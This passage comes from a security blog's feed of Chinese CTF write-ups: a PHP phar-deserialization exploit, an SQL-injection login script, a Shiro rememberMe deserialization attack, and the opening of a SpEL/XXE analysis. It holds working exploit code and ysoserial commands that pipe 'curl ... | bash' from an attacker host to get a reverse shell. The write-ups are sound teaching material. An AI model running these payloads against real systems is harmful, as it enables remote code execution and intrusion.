class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     $text= <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">     $text = base64_encode(file_get_contents($text));</span><br><span class="line">     <span class="keyword">return</span> $text;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>赋值source为/flag即可，那么可以构造exp如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sky = <span class="keyword">new</span> Show();</span><br><span class="line">$sky-&gt;source = <span class="string">"/flag"</span>;</span><br><span class="line">$sky1 = <span class="keyword">new</span> S6ow();</span><br><span class="line">$sky1-&gt;params[<span class="string">'_show'</span>] = <span class="string">'file_get'</span>;</span><br><span class="line">$sky1-&gt;file = $sky;</span><br><span class="line">$sky2 = <span class="keyword">new</span> Sh0w();</span><br><span class="line">$sky2-&gt;str = $sky1;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'skyfuck.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.php'</span>, <span class="string">'test'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line">$phar-&gt;setMetadata($ss);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'skyfuck.phar'</span>, <span class="string">'skyfuck.gif'</span>);</span><br></pre></td></tr></table></figure></p><p>运行脚本后生成skyfuck.gif，上传后，利用file.php的文件读取，使用phar://去访问该文件，最终可以拿到flag：<br><img src="/images/2019-10-19-13-58-59.png" alt=""></p><h2 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h2><p>拿到题目，发现有注册和登录功能，同时提示只有admin才可以拿到flag，那么猜测是一道二次注入的题目，为了测试方便，写了一个脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.session()</span><br><span class="line">url_signup = <span class="string">'http://47.104.173.173:7002/signup'</span></span><br><span class="line">url_login = <span class="string">'http://47.104.173.173:7002/login'</span></span><br><span class="line">email = <span class="string">'222@3333.com'</span></span><br><span class="line">payload = <span class="string">"admin'or'dddd'='dddd#"</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'email'</span>:email,</span><br><span class="line"><span class="string">'name'</span>:payload,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">s = requests.post(url=url_signup,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Email address already exists'</span> <span class="keyword">in</span> s.content:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Email address already exists.'</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">'Username already exists.'</span> <span class="keyword">in</span> s.content:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Username already exists.'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'email'</span>:email,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">s = requests.post(url_login,data)</span><br><span class="line"><span class="keyword">print</span> s.content</span><br></pre></td></tr></table></figure></p><p>发现题目过滤了空格，那么我们构造”万能密码”，也就是闭合admin为恒真条件，即可拿到flag:<br><img src="/images/2019-10-19-13-58-31.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;lol&quot;&gt;&lt;a href=&quot;#lol&quot; class=&quot;headerlink&quot; title=&quot;lol&quot;&gt;&lt;/a&gt;lol&lt;/h2&gt;&lt;p&gt;拿到题目后，发现有一个上传页面：&lt;br&gt;&lt;img src=&quot;/images/2019-10-19-10-50-10.png&quot; alt
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 OGeek Final &amp; Java Web</title>
    <link href="http://skysec.top/2019/09/28/2019-OGeek-Final-Java-Web/"/>
    <id>http://skysec.top/2019/09/28/2019-OGeek-Final-Java-Web/</id>
    <published>2019-09-28T04:27:37.000Z</published>
    <updated>2019-09-28T07:59:57.794Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间参加了OPPO举办的OGeek网络安全比赛线下赛，遇到一道Java Web，由于不太擅长，只是做了防御没有攻击成功，趁周末复盘一下~</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>拿到题目，发现没有啥功能：<br><img src="/images/2019-09-28-12-30-50.png" alt=""><br>顺势看了一眼源码：<br><img src="/images/2019-09-28-12-32-00.png" alt=""><br>看到shiro后立刻可以想到shiro的反序列化漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://paper.seebug.org/shiro-rememberme-1-2-4/</span><br></pre></td></tr></table></figure></p><p>可以看到存在漏洞的shiro版本号为：1.2.4，我们查看题目当前版本：<br><img src="/images/2019-09-28-12-34-35.png" alt=""><br>那么显然，是存在shiro反序列化攻击的。</p><h2 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h2><p>查阅相关资料可以知道，该漏洞的利用，涉及如下几个重要的点：</p><ul><li>rememberMe cookie</li><li>CookieRememberMeManager.java</li><li>Base64</li><li>加密算法</li><li>加密密钥硬编码</li><li>Java serialization<br>我们可以知道，攻击的可控点在登录时的RememberMe，但是该值是需要序列化、加密、Base64的，那么很自然的，我们第一步应该是去寻找它对应的加解密算法，我们查看配置文件:<code>webapps/web/WEB-INF/classes/spring-shiro.xml</code>，发现如下关键信息：<br><img src="/images/2019-09-28-12-37-10.png" alt=""><br>可以得知我们的加解密算法位置在ShiroRememberManager类中，我们进行查看：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] getKeyFromConfig() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InputStream fileInputStream = <span class="keyword">this</span>.getClass().getResourceAsStream(<span class="string">"remember.key"</span>);</span><br><span class="line">        String key = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span> (fileInputStream != <span class="keyword">null</span> &amp;&amp; fileInputStream.available() &gt;= <span class="number">32</span>) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[fileInputStream.available()];</span><br><span class="line">            fileInputStream.read(bytes);</span><br><span class="line">            key = <span class="keyword">new</span> String(bytes);</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            BufferedWriter writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(<span class="keyword">this</span>.getClass().getResource(<span class="string">"/"</span>).getPath() + <span class="string">"com/collection/shiro/manager/remember.key"</span>));</span><br><span class="line">            key = RandomStringUtils.random(<span class="number">32</span>, <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_="</span>);</span><br><span class="line">            writer.write(key);</span><br><span class="line">            writer.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        key = (<span class="keyword">new</span> Md5Hash(key)).toString();</span><br><span class="line">        <span class="keyword">return</span> key.getBytes();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">        var4.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>我们关注到关键点：加密密钥硬编码，其密钥位置为：<code>com/collection/shiro/manager/remember.key</code><br>我们可以查看其值为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat remember.key</span><br><span class="line">wR&amp;_(NVG#c&amp;9(CDhaDMZELDmxSe(mwbB</span><br></pre></td></tr></table></figure></p><p>找到了密钥位置，我们去查看一下加解密算法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> CipherService cipherService = <span class="keyword">new</span> ShiroCipherService();</span><br></pre></td></tr></table></figure></p><p>关注到ShiroCipherService类：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] plaintext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    String sign = (<span class="keyword">new</span> Md5Hash(UUID.randomUUID().toString())).toString() + <span class="string">"asfda-92u134-"</span>;</span><br><span class="line">    Subject subject = SecurityUtils.getSubject();</span><br><span class="line">    HttpServletRequest servletRequest = WebUtils.getHttpRequest(subject);</span><br><span class="line">    String user_agent = servletRequest.getHeader(<span class="string">"User-Agent"</span>);</span><br><span class="line">    String ip_address = servletRequest.getHeader(<span class="string">"X-Forwarded-For"</span>);</span><br><span class="line">    ip_address = ip_address == <span class="keyword">null</span> ? servletRequest.getRemoteAddr() : ip_address;</span><br><span class="line">    String data = <span class="string">"&#123;\"user_is_login\":\"1\",\"sign\":\""</span> + sign + <span class="string">"\",\"ip_address\":\""</span> + ip_address + <span class="string">"\",\"user_agent\":\""</span> + user_agent + <span class="string">"\",\"serialize_data\":\""</span> + Base64.getEncoder().encodeToString(plaintext) + <span class="string">"\"&#125;"</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] data_bytes = data.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] okey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString().getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] mkey = (<span class="keyword">new</span> Sha1Hash(UUID.randomUUID().toString())).toString().getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] out = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2</span> * data_bytes.length];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data_bytes.length; ++i) &#123;</span><br><span class="line">        out[i * <span class="number">2</span>] = mkey[i % mkey.length];</span><br><span class="line">        out[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="keyword">byte</span>)(mkey[i % mkey.length] ^ data_bytes[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[out.length];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; out.length; ++i) &#123;</span><br><span class="line">        result[i] = (<span class="keyword">byte</span>)(out[i] ^ okey[i % okey.length]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Util.bytes(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以往的加密算法一般为AES，可以发现这里出题人自己编写了一个加密规则，简单看一下，应该是一个异或加密，相应的解密规则也不需要我们编写，出题人也直接给出了解密规则：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    String skey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString();</span><br><span class="line">    <span class="keyword">byte</span>[] bkey = skey.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] data_bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[ciphertext.length];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ciphertext.length; ++i) &#123;</span><br><span class="line">        data_bytes[i] = (<span class="keyword">byte</span>)(ciphertext[i] ^ bkey[i % bkey.length]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] jsonData = <span class="keyword">new</span> <span class="keyword">byte</span>[ciphertext.length / <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; jsonData.length; ++i) &#123;</span><br><span class="line">        jsonData[i] = (<span class="keyword">byte</span>)(data_bytes[i * <span class="number">2</span>] ^ data_bytes[i * <span class="number">2</span> + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    JSONObject jsonObject = <span class="keyword">new</span> JSONObject(<span class="keyword">new</span> String(jsonData));</span><br><span class="line">    String serial = (String)jsonObject.get(<span class="string">"serialize_data"</span>);</span><br><span class="line">    <span class="keyword">return</span> Util.bytes(Base64.getDecoder().decode(serial));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但值得注意的是，其中加密算法还是带有一个随机值：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] mkey = (<span class="keyword">new</span> Sha1Hash(UUID.randomUUID().toString())).toString().getBytes();</span><br></pre></td></tr></table></figure></p><p>但该值是用于签名，在解密时，并不会校验签名，所以并没有什么影响。</p><h2 id="Exp编写"><a href="#Exp编写" class="headerlink" title="Exp编写"></a>Exp编写</h2><p>拥有了密钥、加密算法，那么剩下的就是构造我们的exp了，不同往上存在的exp，我们需要自己进行改写exp加密部分，首先我们查看lib文件下：<br><img src="/images/2019-09-28-12-56-27.png" alt=""><br>我们发现使用了commons-collections-3.1.jar，通过ysoserial.jar进行查看：<br><img src="/images/2019-09-28-12-57-45.png" alt=""><br>在内网环境中，攻击目标为：192.168.1.185，而攻击者为192.168.1.230，<br>我们通过ysoserial.jar进行exp构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar JRMPClient &apos;192.168.1.230:22222&apos; | base64 &gt; poc</span><br></pre></td></tr></table></figure></p><p>生成对应exp，然后编写我们的payload加密脚本：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.rngom.parse.host.Base;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.CryptoException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.hash.Md5Hash;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.hash.Sha1Hash;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> org.omg.PortableInterceptor.SYSTEM_EXCEPTION;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String b64_pay = <span class="string">"rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxl\n"</span> +</span><br><span class="line">        <span class="string">"Y3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhh\n"</span> +</span><br><span class="line">        <span class="string">"bmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVy\n"</span> +</span><br><span class="line">        <span class="string">"AAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3\n"</span> +</span><br><span class="line">        <span class="string">"QwAKVW5pY2FzdFJlZgAaY3VybCAxMDYuMTQuMTE0LjEyNyB8IGJhc2gAALXUAAAAADbgqhEAAAAA\n"</span> +</span><br><span class="line">        <span class="string">"AAAAAAAAAAAAAAB4"</span></span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"&#123;\"user_is_login\":\"1\",\"sign\":\"d912fc80c68563b2f5ad7b784d56e0c1asfda-92u134-\",\"ip_address\":\"192.168.1.185\",\"user_agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36\",\"serialize_data\":\""</span>+b64_pay+<span class="string">"\"&#125;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String key = <span class="string">"wR&amp;_(NVG#c&amp;9(CDhaDMZELDmxSe(mwbB"</span>;</span><br><span class="line">        key = (<span class="keyword">new</span> Md5Hash(key)).toString();</span><br><span class="line">        <span class="keyword">byte</span>[] key_b = key.getBytes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//System.out.println(decrypt(cipher_b, key_b));</span></span><br><span class="line">        System.out.println(encrypt(json, key_b));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ByteSource <span class="title">encrypt</span><span class="params">(String data, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data_bytes = data.getBytes();</span><br><span class="line">        <span class="keyword">byte</span>[] okey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString().getBytes();</span><br><span class="line">        <span class="keyword">byte</span>[] mkey = (<span class="keyword">new</span> Sha1Hash(UUID.randomUUID().toString())).toString().getBytes();</span><br><span class="line">        <span class="keyword">byte</span>[] out = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2</span> * data_bytes.length];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data_bytes.length; ++i) &#123;</span><br><span class="line">            out[i * <span class="number">2</span>] = mkey[i % mkey.length];</span><br><span class="line">            out[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="keyword">byte</span>)(mkey[i % mkey.length] ^ data_bytes[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[out.length];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; out.length; ++i) &#123;</span><br><span class="line">            result[i] = (<span class="keyword">byte</span>)(out[i] ^ okey[i % okey.length]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ByteSource.Util.bytes(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行即可生成对应的RememberMe的值，并将该值作为RememberMe的值，放于Cookie中，先运行以下命令，再将请求发送给攻击目标：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 22222 CommonsCollections5 &apos;curl 192.168.1.230 | bash&apos;</span><br></pre></td></tr></table></figure></p><p>即可反弹shell。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>还是对Java不太熟练，比赛的时候，这个漏洞的难度还是低于PHP的（，以后还得加加油</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前段时间参加了OPPO举办的OGeek网络安全比赛线下赛，遇到一道Java Web，由于不太擅长，只是做了防御没有攻击成功，趁周末复盘一下~
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 Trend Micro CTF &amp; Java Web</title>
    <link href="http://skysec.top/2019/09/27/2019-Trend-Micro-CTF-Java-Web/"/>
    <id>http://skysec.top/2019/09/27/2019-Trend-Micro-CTF-Java-Web/</id>
    <published>2019-09-27T06:43:07.000Z</published>
    <updated>2019-10-19T02:49:43.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前写的文章都是偏重于php，本篇文章就以2019 Trend Micro CTF的一道300分的Java Web开始我的Java之路吧~</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目给了1个war包，那么很明显是一道代码审计题目，我们使用JD-GUI打开分析一下代码，代码结构大致如下：<br><img src="/images/2019-09-27-14-47-08.png" alt="">zhao<br>我们在Office类中看到需要接收2个参数：<br><img src="/images/2019-09-27-14-49-53.png" alt=""><br>继续往下跟进，我们看到一个明显的spel表达式注入点：<br><img src="/images/2019-09-27-14-52-49.png" alt=""><br>而nametag正是我们传入的参数，同时未做任何过滤，便带入了表达式中进行解析，那么这明显是一个可控利用点。<br>但是如何进入该if条件句成为了一个问题，我们注意到：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String keyParam = request.getParameter(<span class="string">"key"</span>);</span><br><span class="line">String keyFileLocation = <span class="string">"/TMCTF2019/key"</span>;</span><br><span class="line"><span class="keyword">if</span> (key.contentEquals(keyParam))</span><br></pre></td></tr></table></figure></p><p>我们必须满足我们传入的key和文件<code>/TMCTF2019/key</code>中的值一致才可以进入该条件句，那么只要找到一个文件任意读取的点即可。</p><h2 id="XXE任意文件读取"><a href="#XXE任意文件读取" class="headerlink" title="XXE任意文件读取"></a>XXE任意文件读取</h2><p>继续审计代码，发现在Person类中，存在XXE文件读取点：<br><img src="/images/2019-09-27-15-00-01.png" alt=""><br>而结果会回显在Server类中：<br><img src="/images/2019-09-27-15-00-38.png" alt=""><br>我们写出对应的exp：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span 